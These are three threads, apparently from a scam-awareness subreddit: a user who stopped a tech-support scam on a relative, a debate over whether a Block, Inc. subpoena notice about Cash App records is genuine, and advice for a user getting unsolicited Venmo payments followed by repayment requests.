Title: Thanks to this sub, I recognized as scam as it was happening
Body: Family member pulled the rest of us into a room saying we had a hacker on the home network and we had to turn off all our devices. He was on the phone with a security service and they were helping reset things, talking him through checking his accounts for suspicious activity‚Ä¶

In other words, the classic tech support scam in progress. Long story short, I recognized it and shut it down and knew what steps to take afterward -because posts from this forum sometimes pop into my Home feed-.

I don‚Äôt know whether this is a ‚Äúlow-effort post‚Äù and will be cleaned up shortly, but I couldn‚Äôt not jump on here to say thanks, everyone. I‚Äôm off to review the warning signs for recovery-effort scams‚Ä¶

- One of the warning signs was that he wanted us to stay off all our other devices, and my first thought was that I needed to Google the ‚Äúerror message‚Äù and see what people had posted here. Why was he trying to cut us off from all other sources of information? Red flag.
- That family member should visit this here subreddit. Not even to post, just to read.
- Glad that we in the community could be of service!
- "¬†a security service talking him through checking his accounts for suspicious activity‚Ä¶"

No legit company is touching that liability with a 10 ft pole!

Also, without knowing your transaction habits, how do they discover "suspicious activity"?
- Glad this sub helped.  Some days, it feels like we are just shouting into an abyss.
- I love hearing these stories.  It's why I personally post in here.  Knowing the subreddit helped someone avoid getting scammed is very rewarding
- I show the posts in this sub frequently to my wife and daughter so that they can be more informed.  My daughter is autistic and this sub has helped me keep her aware of the common scams.  She's very vigilant now and has never fallen for one.
- >I don‚Äôt know whether this is a ‚Äúlow-effort post‚Äù

Oh you did well, both on stopping the scam and writing this post.

/modHatOn You have no idea what the actual low-effort posts left on the Review Queue floor are like...
- This is why I joined this sub. I'm now aware of many scams that I would not have been otherwise.
- I got a fake vendor email at work today. There were other red flags but the "kindly" stood out like a neon sign after being in this sub for a while.
- Thank you, kind strangers (2 of you!) for my first award.

Have thought of a lesson-learned tip from the aftermath. After the initial round of changing passwords, he wanted to report it and get the banks to put holds or watches or whatever they could do. This was -very- difficult to do. The phone-option trees just weren‚Äôt set up for that, and the agents we could talk to weren‚Äôt able to help across department silos.

The best thing, in the end, was to get in the car and drive to the local branches of anything that might have been affected. Not a practical option for everyone, I realize, but if you can, try it.
- ü•∞
- I almost fell for this once. If you‚Äôre not aware of the scam then you don‚Äôt know it is a scam. Thankfully my son had been watching YouTube videos of people exposing scammers and warned me. Why I joined this subreddit.
- üëèüëèüëèüëèüëè ~ we need more good stories in here!
- Great to hear this, saving money, one person at a time!
- I wasn't so lucky as to financially survive a scam. I didn't even think to come here to learn more about scams. It's funny and it's sad all rolled into one. But nothing funny about losing $3k.
- Yay! I hope your family takes you out to a great dinner as a thank-you!
- Speaking out about how you fell for a scam is important. It feels embarassing and like something you'd like to cover-up, but it's only by talking about it you can stop it happening again.
- Hell yeah
- Just so you can share with everyone here. What were the next steps you took? Like aside from just hanging up the phone. They might‚Äôve already had access to his account.
- I had an "artist" on tiktok reach out really friendly. They made small talk no red flags, account looked legit. Then they told me they liked my aesthetic and if they could use photos of me for an art piece for some school project and that they would pay me. I went back and forth and they kept pushing for a WhatsApp or my phone number, which I did stupidly give out. (#) - luckily their insistence to pay me, and the route to pay me (I think via check but also their fixation on paying me set off alarm bells)  they told me they'd "work on the project " and get back to me in x days. I looked it up, found out it's a common scam, blocked them and never heard from them again.

- I'm glad you shared this. I love this sub because I've learned about scams that I never knew existed. I mean, I knew the usual common scams, but the bad guys are coming up with more everyday.
- I know we can get kinda snarky and cynical here, but the idea is exactly this. To starve the scammers by raising awareness. None of their threats seem so scary when you‚Äôve read that exact wording 100 times before. If you are even remotely informed, they lose all their power. 

Then if they don‚Äôt make quota im sure their taskmasters at the scam camp on an island somewhere will cut their toes off, but thats fine. You don‚Äôt need toes.
- Yay! Hopefully nothing was damaged to your people.
- This is such a good reminder of how sneaky scammers can be! 

The whole "stay off your devices" thing is a red flag. It makes you wonder why they‚Äôre so desperate to cut you off from other information. It‚Äôs awesome that you recognized the scam and acted fast!

This sub is such a great resource. Posts like these help people stay one step ahead. 

Thanks for sharing, and yeah, definitely review those recovery scam warning signs
- I come here regularly and find it useful.

Every so often there's a new scam or a new twist on an old scam and it's usually here I hear of it first.

This is a decent sub.
- Knowledge is Power and it's never been more essential than in our current age.

Glad you were able shut it down.
- Post is welcome. Thanks for sharing.
- bravo!
- [removed]
- How did the interaction with the rest of your family go down? Did they immediately believe him or were they enlightened like you? What were you all saying to your family member? Did the scammer realise there were multiple people in the room?
Insane to think that the scammer could have manipulated a whole household of people with just one phone call..
- My Facebook got hacked, I called"recovery",it was a hacker,he said they were stealing from my PayPal,I fell for it,he got $500 really fast until my son said " shut your phone off!". Yes,I feel like an idiot, I don't know how they got my e-mail,or password .It made my life a living hell for a while..just so everyone knows there's phone number for Facebook you are on your own.hopefully this helps someone.
- Yup; it' easiest to scam someone who is alone; but if they have company, getting them all completely off the internet is absolutely essential.
- I‚Äôm here often to read. I‚Äôve dealt with scammers too and I‚Äôve gotten better at what to look for now too.
- I'm in my 50s, and my husband is in his 60s. I am constantly telling him about the scams that I read about here. 

I appreciate all of the warnings and learning about many of the scams. I'm grateful to learn what to do and not to do.

You may be shouting into an abyss, but people are listening and learning from you.
- I walk my (80 year old) mom though the latest scams every month. She's pretty sharp, but watching for the day she isn't.
- I used this sub recently on the Wells Fargo/Zelle scam. I put my phone on speaker while I searched the sub. By the time I got to the ‚ÄúZelle fraud‚Äù guy, I was laughing at him. I didn‚Äôt give out any info.
- *Really?*

Yes, really. 

*But really really?*

(facepalm) Really.

*What if...?*

No.
- You're performing an invaluable service! Thank You! Thanks to ALL of you!
- If someone comes here already scammed, at least we can warn them about recovery scams. I'd consider that valuable in its own right too.
- I (40s) am pretty scam savvy but one thing I didn't know about was the plethora of TikTok and Facebook-based scams and shady sellers. I don't use either platform but my mom (70s) does, and thanks to this group I was able to tell her not to buy shit off social media links and explain why. She tends to be very careful with her money, so the thought of someone stealing her credit card info scared her into stopping.

Believe me, this group is doing a lot of good, even if you all don't know it.
- Thank you for the thankless task of modding.
- As someone who is disabled getting to a local branch sure isn't easy, but good to know. Knowledge is power.
- Tip: Freeze your credit with the 3 major credit bureaus (Experian, Equifax, TransUnion).
- I've had good luck with the "fraud department" request.
- I had a friend I have known since high school (I am 66) try to hook me up with a government program called HELLO.  If I gave them $1,000.00 I would get $30,000.00 no strings attached.  This friend was my little deceased sister's bff since nineth grade and her FB proudly proclaims her Christian faith.  (My little sister passed three years ago)  She and the agent tried to pressure me into doing this transaction.  My mother advised me to ask the friend for a loan of $1,000.00.  At first she agreed, then try to get me to pay $200.00 and then $600.00.  I have had two serious illnesses for 26 years.  I told her I didn't have the money because I was on SSI.  I checked on HELLO and I needed some special software to open the website and it was very hard to find the website. They pressured me via FB for four days.  I still can not believe my little sister's BFF and someone she was still closely in touch tried to get me into a scam.
- OP should just swipe the family's credit cards and order a fabulous dinner online, using a weird alias.
- Through other means and devices, changed passwords and shut down online access of any kind to‚Ä¶well‚Ä¶everything. The computer involved was in need of replacing, so that‚Äôs what‚Äôs going to happen. Sent him a link to the recovery-scam information, will set up credit monitoring, will work through the rest of the standards given on this sub, and then we‚Äôll be taking further advice on extended steps from an IT professional in the family.
- If anyone wants to send you money it's a scam, I had a guy who wanted me to walk his dog,I agreed.He then asked me if I could order dog food,dog spray and a vacuum,and wanted my e-mail so he could send me $.When I asked him why he couldn't order it he didn't answer me.I blocked him.He even sent me pictures of a pekingese,like five! I saw the same scam a few days later with a different profile name. Posted scam!!!

- Try getting everyone off the internet at my house is like nailing jello to the wall; ain‚Äôt happening for any reason ü§£ Can‚Äôt get scammed this way. My willful son would have a word with this dude interrupting his games.
- Same here. My wife and I are tech savvy GenXers, but much to my surprise she recently fell for a ‚ÄúUSPS address incomplete‚Äù scam and we had to shut down a credit card of ours, leading to a lot of hassle.

I decided to educate myself by joining this sub and keeping tabs on what‚Äôs out there. It‚Äôs been very useful.
- or "I already gave them..." "How do I make them stop..." or my personal favorite "Where do I report them so I can get my money back."
- Thank god for willful sons!
- The last scammer I dealt with made it very easy for me to detect him as a scammer. Lovebombing was one of a few things he did. The picture he sent me of him and his ‚Äúdaughter‚Äù was another giveaway. I google image search the pic he gave me of him and directed me to a scam digger site with 8 pages of aliases (and it‚Äôs still growing too). One other person had the same image I had. His ‚Äúdaughter‚Äù came back to YouTube. Had a sob story to go along with it. He said that he ‚Äúmade $15M/monthly and can pay me back‚Äù. Right. Called him a scammer and he didn‚Äôt like it.

Edit: in the sentence where I talk about goggle image is, I changed his to him. Also, about the money, I forgot to put made.
- I was at the post office when someone came in to check with them about one of those messages and the usps workers told them it was a scam. I knew but hopefully the other patrons took notice. I was impressed the person at least actually took the time to ask someone who knew before acting.
- Every time I get one of those emails I reply back and say, "what part of my address do you have? I'll fill in the blanks from there". Funny how they never respond back.
- or "I sent all my money in crypto to this random stranger who promised me riches, how do I get it back?"
- Best to not respond at all. Scammers who get responses, no matter the tone, make a list of numbers ‚Äúthat responded‚Äù and they sell those lists to scammers - they wanna know the numbers are connected to a ‚Äúlive person‚Äù

Title: A whole bunch of my family/friends all recieved this email from Block.inc at the same time.
Body: At 7:16pm EST on January 24th 2025, I recieved an email from Block Law Enforcement with the subject line of Block, Inc. (formerly Square, Inc.) Subpoena Related to Your Account, Case No. 34422 | (SQ202412090210121030go3L), I immediately started panicking, when I came home later in the night fully prepared to discuss how I'm concerned about what I might have accidently done, I walked in on my mother on the phone with my brother talking about how they recieved the same email at the same time.

It turns out that family and friends I've interacted with through cash app all recieved the same email with the same subject line and the same pdf attachment. My mother and brother have only ever sent me money, while my brothers sister-in-law and my friends I've only sent money to.

I feel like 85% sure this might be a scam, previous posts I've found on reddit the comments can't seem to agree on whether or not it is a scam or legit so I'm still freaking out a little bit. So I'm trying to find out if anyone who I have no interactions with recieved an identical email at the same time and date, January 14th at 7:16 pm eastern standard time.

For our sighted readers I've included screenshots of the email, the email header with private info redacted, and the first page of the pdf which I opened on my phone to reduce chance of virus and malware. For our blind readers I will include transcripts of these below.

## The Email

Hello,

Thank you, Block Law Enforcement Response Team

- This is either legitimate or one of the most high-effort scams I've ever seen. The only red flag I can see is that I'm pretty sure subpoenas can't be served over email but I could be wrong.

Also, the wording itself has a few of those telltale signs that it was written by someone who's first language is not English and who's second language is specifically British English.
- I mean‚Ä¶.  Just look up the Indiana department of workforce development and call and ask for that Kimberly person.   Don‚Äôt use any phone numbers in the email.  Look them up yourself.  I feel like there‚Äôs quite a few things you could do on your own to determine if this is legit.
- What about this makes you think it's a scam? Google, for example, lets you know when your information is included in a chunk of records (or whatever) that they've been subpoenad for.
- The company itself has been subpoenaed and is being investigated, not you. It just means the company may have to release information related to the users. Many states are involved, anyone whose information they have should be receiving a notice like this. No worries; you do not need to do anything except you can join a class action lawsuit if you want.

https://www.rld.nm.gov/2025/01/15/new-mexico-joins-80-million-enforcement-action-against-block-inc-cash-app/
- No, this is almost assuredly legit, but as others have said, it‚Äôs Block (not you specifically) that is being subpoenaed‚Ä¶. But your data is part of what is being reviewed by law enforcement to potentially reveal Block‚Äôs wrongdoing and wrongdoing by any of Block‚Äôs users. You can Google ‚ÄúBlock Cash App Bank Secrecy Act‚Äù to find out more about why. There should be a CSBS result near the top that is what you‚Äôre looking for. 

Ultimately, if you weren‚Äôt using Cash App for anything illegal, you should be fine.

Edit: mistyped App when I meant Act
- A subpoena is a command to a PERSON to appear or to produce something. It can't be addressed to "Dear Sir or Madam." It would need to have your actual name on it. And if your name is on the subpoena, then one would think that it would be on the letter. The fact that *none* of these correspondence address you by name points to them being bogus.

*Edited:*

I've re-read your post, and I think what's going on here is that you aren't the party being subpoenaed. Block/Square is, and they're simply letting you know that fact, since they may have to turn over information related to you and/or your account. Since this is basically just an FYI, you should be fine.
- This appears to be legitimate. This agency investigates and prosecutes benefits fraud. The state suspects someone on benefits was receiving money under the table and not declaring that as income.
- As an employer in Indiana, I have seen my fair share of correspondence from DWD.  This looks legit.  I would assume you, or someone you have had contact with via this payment app is under investigation for UI (unemployment insurance) or other benefit fraud.  

This is Block, giving you a 'heads up' that they were subpoenaed for your information, and have turned it over. 

Good luck!
- I would consider this as very possibly legit and take it from there.  Don't let the Sir/Madam greeting make you automatically think it's a scam, since the attached subpoena which we cannot see, is being sent to a custodian of records.
- How the hell can you read the first two sentences of this email and not understand that it is Block Inc that was served with the subpoena, and this is 1) a courtesy email letting the person know their information may be released as part of Block Inc complying with the subpoena, and 2) there is no request for any action by the recipient?
- This is probably legit. What is their ‚ÄúExhibit A‚Äù asking for?
- Were you or someone you transacted with on unemployment in Indiana? Seems legit.
- What is Kimberly email address, does it end with .in.gov? If so, probably a legit letter. There is a Kimberly that works for Indiana Department of Workforce Development as an unemployment insurance auditor in linkedin.
- Definitely a scam...people everywhere are getting these, it was on the news about these
- [deleted]
- The demand that you provide documentation is bogus, as you have not been named in any subpoena. It's possible that Block is being compelled by subpoena, but that's on them and not on you. If you were being compelled by a subpoena duces tecum, you would be personally served the subpoena and it would name or identify you. Dear Sir or Madam is not personal service of a subpoena.

The demand is also utterly ridiculous as the email was January 24 but has a deadline of January 8.
- No big coincidence.  Someone in your friend or family group got their contacts compromised (email hack, malware on the computer, etc.)  All those contacts got tossed into the scam-transmission hopper in the same batch, so all the "Hey sucker, send to me large gift card!" emails went out around the same time.

ETA:  On a 2nd pass, it's not something YOU need to take action about, and if it's legit it might actually be similar to the "all the contacts" thing I suspected w/ a scam... Some individual you're a first- or second-tier contact with via cashapp is being investigated, and they demanded all cashapp's info on transactions with their payees/recipients.
- No signature from a magistrate or judge? Seems a little sus.
- Yeah. That‚Äôs how courts work: email you a subpoena. This is why ignorant people stay poor.
- Yea ur fucked bud I use square and didn‚Äôt get that letter
- If it was legit they would actually put the name of the person they‚Äôre contacting and not say ‚Äúhello,‚Äù or ‚Äúsir/madame‚Äù this is a scam. Also the dates are so different and questionable
- [deleted]
- I was planning on doing this on Monday. But I'm trying to ease my mind a little bit until then.
- This does not appear to be related to the class-action. This subpoena stems from Indiana DWD. The department responsible for both giving unemployment payments,  and investigating fraud related to it.
- 1. Some government agencies have subpoena power, in addition to courts and lawyers engaged in litigation.  This one appears to originate from an Indiana state agency.  
2.  The OP hasn't shown the actual subpoena, only a cover letter explaining that a subpoena was enclosed, and the attachment specifying documents.  
3.  The subpoena wasn't to the OP, but to some cash app that the OP uses.  There's no reason why the OP would be named in the subpoena.  As was fairly clear from the documents demanded in Attachment A, the demand to the cash app was related to all accounts.  
4.  The parts of the correspondence shown by the OP are absolutely consistent with standard *subpoena duces tecum* language (a *subpoena duces tecum* is a subpoena for documents, rather than for a personal appearance).  It is completely consistent with such subpoenas from government agencies that my clients have been served with.  
4.  The OP wasn't required to produced ANY documents.
- and the copy of the subpoena in the pdf  has all info redacted

https://preview.redd.it/167kvnacf6fe1.jpeg?width=1080&format=pjpg&auto=webp&s=b12b05487ce4bf35ad3153e1c11d016e6940e995

I edited out address to follow rules but the rest of the black is there in the pdf.
- I agree with you. When companies potentially run afoul of the law and are subject to discovery, they are required to notify their customers who may have their information provided as part of this process.  This letter is simply fulfilling the Block/Sqaure legal notification requirement.  There‚Äôs nothing for the OP to do unless they want to take legal action against Block/Square to prevent the release of this information.  I‚Äôd ignore the letter.  And make sure my credit is adequately frozen with the credit rating agencies (e.g. Experian) to cover my bases.
- In addition to being issued to a specific person, a subpoena is also issued by a court‚Äì not by "Block Inc" or the "Department of Workforce Development".
- Thus my worry, last time I was getting UI benefits was during Covid lockdown and I'm concerned they think I did something wrong but I have no idea what I could've done. And the reason I brought it here is due to the weirdness of my family and friends getting the same email all at once even a new friend that I didn't know while getting the covid relief funds.
- I added a photo of the most redacted page of the subpoena in another comment.
- it's the fact a whole load of people in my immediate circle got the same email at the same time with the same redacted pdf, it set off my scam-dar, no need to assume I can't read.
- I didn't think to check LinkedIn, it does end in dwd(.)in(.)gov.
- It says "law enforcement response team"...
- You mean [these guys](https://www.in.gov/dwd/)?
- You might find it hilarious, but that's the Block Law Enforcement Response Team is legitimate and who any subpoena would go to. The email also isn't asking OP for any information. It's simply informative. This is legit. 

https://squareup.com/us/en/legal/general/gov
- You missed it. This is block letting the person/people whose information was turned over to Indiana DWD let those people know.  Pretty common form letter saying ‚Äúhey, these people wanted your info, and we gave it to them, heads up‚Äù.
- I think they asked for OPs info and all contacts related to OP. I‚Äôd say OP is the target of an Indiana DWD investigation
- This is an email letting the OP know that their information was turned over by Block, as part of a subpoena they received.
- Huh? The court didn't email OP a subpoena.
- It seems to only be sent to people in certain states, and/or jurisdictions who use that company‚Äôs service. That would explain why the OP got one, along with their friends and family, but you didn‚Äôt.
- [https://www.in.gov/dwd/](https://www.in.gov/dwd/)

  
You say "so many things wrong with this" then only say the name of a legitimate organization with a question mark. I don't think you know what you're talking about.
- They don‚Äôt need help, they are informing their customer of the subpoena. There is no requested action from the customer. Based on who the subpoena is from, it sounds like they are doing an investigation into unemployment fraud or something similar.
- It‚Äôs hard to tell.  I think it looks close enough to being legit that I‚Äôd call and try to find out more.   But there‚Äôs also enough weird language that I‚Äôm inclined to think it is a scam.  Just something off about how that letter is written
- Would you like to see the subpoena, I could send screenshots to you? I didn't include all the pictures to try to keep the post concise.
- Yeah... you're simply being notified that some of the information being requested may pertain to you. You should be okay.
- Is it your name or the name of a family member?
- What are the dates on the subpoena? That'll tell you when they're looking.  They usually ask for information from a date range, like, "August 1, 2001 - August 29, 2002" or some shit.  Then you can look through your transactions around that time and see if anything seems odd/off?
- This is consistent with you are some close to you being investigated for unemployment fraud which was rampant during covid. It is possibly prudent to make sure you have the documentation from when you applied for and received unemployment and to think about where you could find a lawyer for yourself or loved ones if things get more serious. Decent chance its a false positive or a friend who sent you some money for a normal reason getting looked into but its not crazy to ask around so you are ready if you get caught up in this.
- Is it possible that everyone who received it is someone you -- or someone in your circle - sent or received funds for? Think of it this way: Person A is committing fraud and as part of that fraud they transfer funds to 10 other people. The investigating agency subpoenas Block and says, "send us all transaction records involving Person A," and Block then notified everyone -- sender or recipient -- who had transactions with Person A. You might be Person A, or one of your friends or family are Person A.
- [deleted]
- The demand to produce info was sent to Block / cashapp.  The demand to Block / cashapp is merely attached to the email sent to OP as the reason their data will be provided to the requestor. OP is being INFORMED that Block / cashapp is going to comply with the request, so some of OP's data will be sent to the requestor.  OP isn't asked to do anything.
- which is why I'm worried because I'm sitting here going "what the hell did I inadvertently do?"
- Exactly.
- [deleted]
- That information and the name of the party being investigated are all redacted, so I don't know.
- The people I contacted who all got the same email at the same time are all people I've recieved or sent money to, two of them I've only sent money, and two of them I've only recieved money (they paid for gas or groceries) in trying to see if there's anyone I've sent and recieved money from to see if I can reach out and see if they got the same email but it's a lot to sift through because I do legit use cash app as my bank because I like the app.
- So what would you call the team of people who respond to law enforcement?  You‚Äôre clueless. Indiana DWD is a state agency responsible for unemployment etc, and the investigation of fraud thereof. This is 100% legit.
- "law enforcement" and "response team" are not synonymous, the former is agencies and employees responsible for enforcing laws and the latter is a group of people who prepare for and respond to law enforcement requests.
- I wasnt saying OP had to provide the info. I was saying that OP's info was in fact handed over.  The commentor was saying it was someone related to OP causing the subpoena, when, its OP who's the cause, and the other family/friends are the ones who are the 'tag alongs' in this case.
- Were you on Unemployment, and took a job for cash? Or did you get an unemployment check after starting a new job? I don't know what all exactly falls afoul of the DWD UI laws, but, those are two big ones.

Or did you claim UI for longer than you should have, etc etc.  If you have a DWD account, you should be able to log in and see if you have any over payments or anything?
- You paid or received money "connected" (however loosely that may be) to someone else they're investigating, most likely.
- Did the subpoena mention you by name directly?

Did all your relatives who got the same email also get personalised subpoenas? 

If yes, then it's more likely you havnt done anything directly,  and they're investing someone you all have had a transaction with at some point in the past. Most likely someone's been caught red handed and you are all listed as someone his account has interacted with.
- That‚Äôs not what OP posted
- It absolutely does. In Indiana DWD is responsible for investigations related to unemployment fraud.
- If everyone in the group received more or less an identical email (as stated by OP) then there's no way to tell either way, and since OP expressed confusion about why they would be a target, it might well be someone else.  If OP was receiving unemployment payments from the requesting agency and is feigning ignorance, well, there's not much we can do about unreliable narrators.
- On re-reading the post, you are correct.
- I checked my cash app history when I was receiving covid relief funds from unemployment and I can't see anything that I would think would raise red flags, I was doing gig work as primary income and I reported all of that to them and the still said they would give me money to make up the difference between barely surviving and surviving.
- I think OP was the ‚Äúnamed‚Äù. Like we need info from George smith and all of his contacts. And op is the George smith. That‚Äôs probably why they are concerned!
- See that's one of my problems we all got the same pdf but the named party and the date range were all redacted.
- AHHH. I thought the redactions were done by you! That's a big difference. Being that we're so far from when you were on UI, its likely someone else. My fault for misunderstanding!
- That's the primary reason my scam-dar was set off because no one I've talked to have gotten an un-redacted copy of the subpoena so it seemed weird and sus to me.

Title: Back in November I tipped a mover with Venmo, now he‚Äôs sending me money unsolicited and requesting it back. Help!
Body: Back in November 2024 I ordered a new bed with ‚Äúwhite glove‚Äù delivery which ended up being a couple of kids, maybe late teens or early 20‚Äôs. I didn‚Äôt have any cash but wanted to give them a tip and I asked them if I could Venmo them, they said sure. So I sent the tip via Venmo, and haven‚Äôt thought about it since. (Maybe this stupid of me, but I‚Äôve done it in the past and have never had any ‚Äúweird‚Äù encounters since‚Äù).

Last week I got a $3 payment from him with the comment  ‚Äúüçï‚Äù. He‚Äôs a young guy, and I assumed this was a mistake and sent the $3 back, he did not request it back. 

Today I have more payments from him for $100, $50, $1, and $20. As well as a request from him for me to send the $170 back to him.

I recognized the profile picture, but the first and last name are different now. I did confirm it‚Äôs the same account I sent a tip in Nov, but the name is completely different (you can see in my screenshots, old name starts with an ‚ÄúO‚Äù and new name is an ‚ÄúA‚Äù).

Anyways, I‚Äôm sure there‚Äôs a scam here, right? This person knows where I live, and may even have some of my personal information from the delivery. What should I do? Thank you in advance!

- Entirely possible his account was compromised and they're trying every contact he has. The $3 could have just been a test. Don't send anything back.. if they are sending stolen funds to you, you could end up out of pocket when/if they are recouped by the victims financial institution.
- Block and ignore. It is indeed a scam.
- UPDATE:

I immediately blocked him, and I am now getting requests from someone saying they‚Äôre his girlfriend and I believe she‚Äôs subtly threatening me with ‚Äúhe has your address‚Äù?

https://preview.redd.it/qs66q5xmm1fe1.jpeg?width=1179&format=pjpg&auto=webp&s=74c4e6651355dffd00650091b389848a2b4c67ff
- Do not send it back just leave it alone
- Most likely a scammer hacked his Venmo account. They 'paid' you with stolen money, which will eventually get clawed back, leaving you $100 short.  If it is really is an accident, he will be able to reverse it through Venmo Customer Support. Just don't touch the money and ignore it.
- You can actually contact Venmo and ask them to reverse the transaction on their end. 

I did this a few weeks ago. If he paid with ‚Äúbad‚Äù money (stolen for instance) and the charge gets reversed, but you already paid him with ‚Äúclean‚Äù money, yours won‚Äôt get reversed but his will so you‚Äôll be out the money. Thats my understanding.
- A few years ago I was at a wedding and we hired a driver that I paid via venmo. Every so often I get a venmo request from him and I'm guessing his account was compromised.
- This is simple.  Tell him to contact Venmo and clear it up.  Then block them.  Done.
- Most likely a hacked account.

Most likley money laundry.

If you want to be safe when someone sent money and ask for it back, let the owner of the app or bank fix it.
- no he‚Äôs not, his account has been hacked.
- Stolen accounts sending stolen funds perhaps?
- Don't send any of the money back. He'll stop soon enough.
- You are being asked to launder stolen funds. Don't. Report to the cops if they don't stop bugging you.
- Block and ignore
- @OP I hope you see this. I accidentally sent money to the wrong account TODAY. I called Venmo and they reversed the charge in minutes and it‚Äôs already back in my bank account. This is NOT your problem.
- lol everyone talking about scammers stealing his account‚Ä¶my friends would move money around like this to take money from his parents account to send to friends and send back. This way they didn‚Äôt know he was pulling out 200+ for drugs but looked like a ‚Äúrent‚Äù payment or something
- For everyone saying it‚Äôs hacked and scammers. How was his account hacked, and the scammers know he assembled a bed for OP? That doesn‚Äôt make sense.
- Glad u didn‚Äôt send it back .
- The person is ‚ÄúWashing‚Äù dirty money to get clean money back from you.
- block and ignore, contact your bank to let them know, do not send them any money back.

if they are getting confused and sending you money, the bank might refund them in addition to the money you send.
- Can you refund payments on venmo? Wouldnt that be the best thing to do instead of sending it back? That way there's a 'paper trail' and they can't dispute anything.

(Sorry I don't have venmo and I just wanted to offer a suggestion)

The company I work for deals with this stuff all the time, people will get unsolicited money then just send it back vs refunding it and will get hit with a chargeback that could have been avoided if the payment was refunded.
- As for the ‚Äúgirlfriend‚Äù contacting you for the money back- i recognize the photo from about 20 other scam products. Why do they all purse their lips like that?
- Just block them on the app. You can block the address and If I were you, I might actually call the person if you have their number and ask them if they‚Äôre the ones doing this and if they aren‚Äôt then they‚Äôll at least know that their account was compromised and if they are, you should tell them that you could file charges against him, and you could actually bring it up to Venmo and explain to them. What is going on they could ban his account.
- If it's indeed stolen money like many here say you have to contact your bank asap don't just leave it tell your bank what's going on have them send it back.
- Most likely hacked. If anything, contact PayPal.
- Task
- His kid could have gotten his phone and messed with the account
- Card Fraud intake manager for a large financial institution here.

P2P transactions are notoriously difficult to dispute when the disputing party has played a role in the transaction (as participating, authorizing, OR receiving benefit for something precludes it from being Fraud per Reg E).

In these cases, a dispute would only be to claim that the platform (Venmo, CashApp, etc.) did not process the transaction or provide services correctly.

But here's the thing, if you sent money to a scammer, the platform doesn't care. It did what you asked. And since you authorized it, it's not Fraud. So you don't get your money back.

That's why these scams are everywhere.
- Say that you have reported it to Venmo, they should contact Venmo and block her
- Ignore the message and block this new sender.  There's nothing to be gained by interacting with them.
- It's the same scammer from another hacked account, just block her too and ignore it.
- block her too, if you send the $100 back they will likely do a charge back and you will be -$100
- Scam this is text book scam do not reply do not send anything report and block
- Not saying it's real but if it's the scammer, how does he know they guy worked for you?  Can't you call the real guy, ask him, and block everyone after
- lol, he didn‚Äôt ‚Äúaccidentally‚Äù send you $170.  He ‚Äúaccidentally‚Äù (but not really) sent you $100, $50 and $20.

Definitely sounds like a scammer trying to launder money through various compromised accounts.

As for the address bit, tell them you‚Äôre going to use the $170 to put up security cameras because they said that the part about knowing where you live (of course don‚Äôt actually spend any of the money because it‚Äôs likely fraudulent).
- BLOCK AND IGNORE AGAIN. it's still him and the threats are pure nonsense.

It's likely that your original venmo tip accidentally went to a scammer. They know that their best chance of victimizing someone is if that person responds, so the original tip put you on this creep's radar. But he is not going to do anything. 

Block and ignore.

Block and ignore. 

Keep doing that and he will go away.
- When people threaten me online with stuff like this I send them a selfie with my gun collection and they usually go away.
- That sounds like a threat - law enforcement needs to know so they can track and shut them down. If you're in the USA, just say they are undocumented and the marines will mobilise... or something... I dunno ¬Ø\\\_(„ÉÑ)\_/¬Ø
- Are you able to block her, too?  Yes? Good
 Do that.

Then move on with your life.
- [removed]
- I don't get how that works? Suppose he linked his Venmo to a bank account and deposited a fraudulent check. Then he sends you $100 on Venmo and you send it back. I don't think Venmo can then take $100 out of your account after his check bounces.
- This is good advice! Thank you.
- what a horrible system
- This is the way
- Every month or so, some acquaintance is surprised that I dont have Venmo.
- I thought hacked too but how would the ‚Äúgf‚Äù know that he had put a bed together for OP?
- Yeah, I did block. I am now getting request and messages from their GF‚Äî who I have also blocked.
- Yea, that's what makes me wonder if it's not a scammer. How did he know about the work? Maybe it was written in the original Venmo pay like a message "for xy". OP should try and contact the guy outside Venmo
- It‚Äôs 100% a scammer. Anyone who threatens you that they ‚Äúknow where you live‚Äù over an accidental $170 Venmo transaction is a scammer. ¬†They would have realized their mistake after the first $3 was sent back. ¬†

If for some reason it‚Äôs NOT a scam, then sorry not sorry - people this dumb to accidentally send this many wrong Venmo‚Äôs and who then make threats when blocked deserve to lose their $170.
- This is Venmo not PayPal.
- For sure, and I understand random shit happens, but it just feels weird.
- There is such a juxtaposition between this great, well stated information, and user name. 

I personally approve of both, just found it amusing.
- Can I ask you more about that?
- And then if someone else contacts you say that you will be filing a police report for harassment. That bit about the address is not ok
- I did block them, immediately after I got the request.
- OP tipped the guy (or at least the original owner of the account, assuming it's been hacked).  Notes on the tip probably say something about it.  If they don't, then the scammer is most likely the original guy.
- The money was sent from a stolen account. Owner of stolen account finds out, files a police report and reports it to their bank, their bank reverses the transaction eventually. Person original receiving the money is out the fraudulent $ and the money they returned.
- This is the best advice; unfortunately these sort of cyber crimes are very common nowadays, especially with all these pay apps. Like the other person said, contact the app customer service and let them know what‚Äôs going on but ignore the requests.
- Yep. We have similar app but the money is being charged right away from your account and you can't do money laundering..
- The gf is probably the same person who contacted OP originally. That person hacked into the other person‚Äôs account. (The one who delivered OP‚Äôs bed.) They can see all the previous transactions of the person they hacked.
- Never used the app, but possible previous transfere was named?

But no normal will be changing there names.

But either way, let the app fix it if money should be sent back.
- Ok but you failed to answer my question. How would a scammer know those details ‚Äúmy bf assembled a bed for you‚Äù? Accurate info according to OP. Only way is if that was annotated in the original transaction but OP never said that.
- I don't think that the person threatened OP that they know where they live, OP is just aware that they know where OP lives because they delivered a bed there.
- valid, but Paypal owns Venmo.
- You're correct. I don't use Venmo and only knew PayPal owned the service.
- You have good reason to feel weird about it. Either his account got hacked and they don't really know your address, or he does and that's concerning for anyone. 

Report your account as compromised, I would have it closed completely if it were me and use another service for 6 months before reactivating. Then definitely report the 3rd party to Mayfair tomorrow
- Well you‚Äôll just love r/rimjob_steve
- I love seeing those juxtapositions on Reddit!¬†
Not long ago I saw a comment that was responding to someone who had lost a family member. The comment was beautiful, poetic, spiritual, gentle, and overall just sweet and wonderful. The username was something like SatanzzSpawnIzHere2KillYou666.
- Sure, happy to provide any insights I can.
- Yeah, it feels icky for sure. The bed I ordered was through Wayfarer, and they used a 3rd party for the delivery. I will be contacting them tomorrow just to be safe. 

I looked through the accounts transactions, and it‚Äôs very obvious most of the transactions are tips from his deliveries, and he‚Äôs probably trying this scam on them as well.
- Good job.
- I mean I see a couple news articles on it but missing crucial details. So the scammer links the Venmo to stolen account, sends you $100. Then you send them $100. Then they link the stolen Venmo account to another bank account and withdraw into it. And then??? Venmo just says fuck it and takes $100 out of your account balance and doesn't try to recoup the money that was transferred out? How does the scammer get their hands on the cash?
